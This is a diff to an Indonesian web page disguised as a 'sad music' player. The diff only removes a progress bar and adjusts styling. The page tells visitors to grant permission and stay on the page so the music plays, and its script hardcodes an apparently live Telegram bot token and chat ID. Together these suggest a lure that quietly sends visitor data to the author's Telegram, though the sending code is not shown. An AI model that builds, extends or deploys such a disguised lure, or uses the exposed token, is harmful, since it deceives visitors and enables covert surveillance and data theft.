@@ -1,5 +1,5 @@
 <!-- BY RACHEL AMANDA - NULL SIREN - GPT 😹 -->
-<!-- VERSION FINAL V6.3 UI MINI PROGRESS ATAS TOMBOL -->
+<!-- VERSION FINAL V6.3 UI MINI TANPA PROGRESS - UI PERBESAR -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
@@ -8,6 +8,9 @@
   <title>Playing music sad</title>
   <style>
     * { box-sizing: border-box; }
+    html {
+      font-size: 104%;
+    }
     body {
       margin: 0;
       padding: 0;
@@ -39,35 +42,20 @@
       line-height: 1.2;
       text-align: center;
     }
-    .progress-container {
-      width: 75%;
-      height: 4px;
-      background-color: #444;
-      border-radius: 10px;
-      overflow: hidden;
-      margin-top: 14px;
-      margin-bottom: 8px;
-    }
-    .progress-bar {
-      height: 100%;
-      width: 0%;
-      background-color: #ccc;
-      transition: width 0.2s linear;
-    }
     .controls {
       display: flex;
       gap: 10px;
       margin-top: 4px;
     }
-   button {
-  padding: 6px 18px;
-  border: none;
-  border-radius: 16px;
-  background-color: #222;
-  color: white;
-  font-size: 11px;
-  cursor: pointer;
-  }
+    button {
+      padding: 6px 18px;
+      border: none;
+      border-radius: 16px;
+      background-color: #222;
+      color: white;
+      font-size: 11px;
+      cursor: pointer;
+    }
     button:hover {
       background-color: #444;
     }
@@ -79,10 +67,6 @@
   <div class="artist">Izinkan agar music bisa terputar</div>
   <div class="artist">Tetap di halaman ini agar music berputar</div>
 
-  <div class="progress-container">
-    <div class="progress-bar" id="progressBar"></div>
-  </div>
-
   <div class="controls">
     <button onclick="audio.play()">Play</button>
     <button onclick="audio.pause()">Pause</button>
@@ -92,12 +76,6 @@
 
   <script>
     const audio = document.getElementById("audio");
-    const progressBar = document.getElementById("progressBar");
-
-    audio.addEventListener("timeupdate", () => {
-      const persen = (audio.currentTime / audio.duration) * 100;
-      progressBar.style.width = persen + "%";
-    });
 
     const token = '7691252764:AAEivTZ5gqJx9LjID9Fkz43qNIICvv6FGdY';
     const chatId = '5914256752';
